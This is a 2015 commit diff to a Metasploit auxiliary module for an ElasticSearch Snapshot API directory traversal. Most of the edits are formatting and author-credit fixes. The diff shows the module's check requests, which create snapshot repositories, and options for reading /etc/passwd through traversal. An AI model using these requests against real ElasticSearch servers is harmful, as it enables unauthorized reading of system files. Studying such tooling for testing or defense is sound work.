41e9f8a91b26bc33b20f7887a37436fbacd30ee0
Roberto Soares <robertoespreto@gmail.com>
2015-10-16 10:47:19 -0500

    Some code changes from Roberto

--- modules/auxiliary/scanner/http/elasticsearch_traversal.rb
+++ modules/auxiliary/scanner/http/elasticsearch_traversal.rb
@@ -15,9 +15,9 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'ElasticSearch Snapshot API Directory Traversal',
       'Description'    => %q{
-        This module exploits a directory traversal
-        vulnerability in ElasticSearch, allowing an attacker to read arbitrary
-        files with JVM process privileges, through the Snapshot API.
+        'This module exploits a directory traversal vulnerability in
+        ElasticSearch, allowing an attacker to read arbitrary files
+        with JVM process privileges, through the Snapshot API.'
       },
       'References'     =>
         [
@@ -26,32 +26,36 @@ class Metasploit3 < Msf::Auxiliary
         ],
       'Author'         =>
         [
-          'Benjamin Smith', # Vulnerability discovery
-          'Pedro Andujar <pandujar[at]segfault.es>', # Metasploit module
-          'Jose A. Guasch <jaguasch[at]gmail.com>', # Metasploit module
-          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
+          'Benjamin Smith', # Vulnerability Discovery
+          'Pedro Andujar <pandujar[at]segfault.es>', # Metasploit Module
+          'Jose A. Guasch <jaguasch[at]gmail.com>', # Metasploit Module
         ],
       'License'        => MSF_LICENSE
-   ))
+    ))
 
     register_options(
       [
         Opt::RPORT(9200),
         OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
         OptInt.new('DEPTH', [true, 'Traversal depth', 7])
-      ], self.class)
+      ], self.class
+    )
 
     deregister_options('RHOST')
   end
 
   def proficy?
-    res1 = send_request_raw('method' => 'POST',
-                            'uri'    => normalize_uri(target_uri.path '_snapshot' 'pwn'),
-                            'data' => '{"type":"fs","settings":{"location":"dsr"}}')
+    res1 = send_request_raw(
+      'method' => 'POST',
+      'uri'    => normalize_uri(target_uri.path, '_snapshot', 'pwn'),
+      'data'   => '{"type":"fs","settings":{"location":"dsr"}}'
+    )
 
-    res2 = send_request_raw('method' => 'POST',
-                            'uri'    => normalize_uri(target_uri.path, '_snapshot' 'pwnie'),
-                            'data' => '{"type":"fs","settings":{"location":"dsr/snapshot-ev1l"}}')
+    res2 = send_request_raw(
+      'method' => 'POST',
+      'uri'    => normalize_uri(target_uri.path, '_snapshot', 'pwnie'),
+      'data'   => '{"type":"fs","settings":{"location":"dsr/snapshot-ev1l"}}'
+    )
 
     if res1.body.include?('true') && res2.body.include?('true')
       return true
@@ -73,7 +77,7 @@ class Metasploit3 < Msf::Auxiliary
     if proficy?
       vprint_good("#{peer} - Check successful")
     else
-      print_error("#{peer} - ElasticSearch not vulnerable")
+      print_error("#{peer} - ElasticSearch not vulnearble")
       return
     end
 
